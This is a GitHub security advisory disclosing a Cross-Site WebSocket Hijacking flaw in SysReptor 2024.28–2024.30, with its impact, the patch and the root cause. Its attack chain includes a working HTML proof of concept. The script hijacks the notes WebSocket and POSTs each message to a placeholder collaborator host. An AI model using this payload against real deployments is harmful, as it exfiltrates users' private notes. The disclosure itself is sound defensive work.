# Cross-Site Websocket Hijacking in SysReptor

Moderate

[aronmolnar](/aronmolnar)
published
GHSA-2vfc-3h43-vghh
May 21, 2024

## Package

SysReptor

## Affected versions

>= 2024.28 <= 2024.30

## Patched versions

2024.40

## Description

## Impact

Cross-Site WebSocket Hijacking in SysReptor from version 2024.28 to version 2024.30 causes attackers to gain read and write access to personal notes and project notes when a logged-in SysReptor user visits a malicious same-site subdomain in the same browser session.

## Patches

Update to SysReptor version 2024.40.

We additionally recommend configuring allowed hostnames/domain names via the [`ALLOWED_HOSTS`](https://docs.sysreptor.com/setup/configuration/#allowed-hosts) setting.

## Detailed Description

The root cause is the switch protocol sequence which is not protected by browsers' same-origin policy. The SysReptor server does not validate the `Origin` when establishing WebSocket connections. SysReptor uses session cookies for authentication, which browsers send cross-origin (but same-site due to SameSite=Strict).

However, the attack is limited to malicious same-site subdomains because SysReptor uses the cookie setting SameSite Strict. Hence, attackers must compromise a subdomain to host a malicious script (e.g., evil.example.com to attack sysreptor.example.com).

Attackers could gain read and write access to personal user notes (`/ws/pentestusers/self/notes/`) and project notes (`/ws/pentestprojects/{target-project-uuid}/notes/`). To access project notes, attackers need to obtain the project UUID.

### Attack Chain

Prerequisites:

* Same-site subdomain
* Logged-in target user
* Project UUID (optional)

1. Compromise a subdomain
2. Host the malicious script on the subdomain:

```
<!DOCTYPE html>
 <html lang="en">
   <head>
     <title>CSWSHJ Exploit</title>
     <script>
      var url = "wss://sysreptor.example.com/ws/pentestusers/self/notes/";
      // var url = "wss://sysreptor.example.com/ws/pentestprojects/{target-project-uuid}/notes/";
       var ws = new WebSocket(url);
       ws.onmessage = function (event) {
         fetch("{burp-collaborator-url}", {
           method: "POST",
           mode: "no-cors",
           body: event.data,
         });
       };
     </script>
   </head>

   <body>
       <h1>CSWSHJ</h1>
       <h3>Triggered exploit...</h3>
   </body>
 </html>
```

3. Trick logged-in users into visiting the malicious subdomain to trigger the WebSocket hijacking attack and exfiltrate data from the WebSocket.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
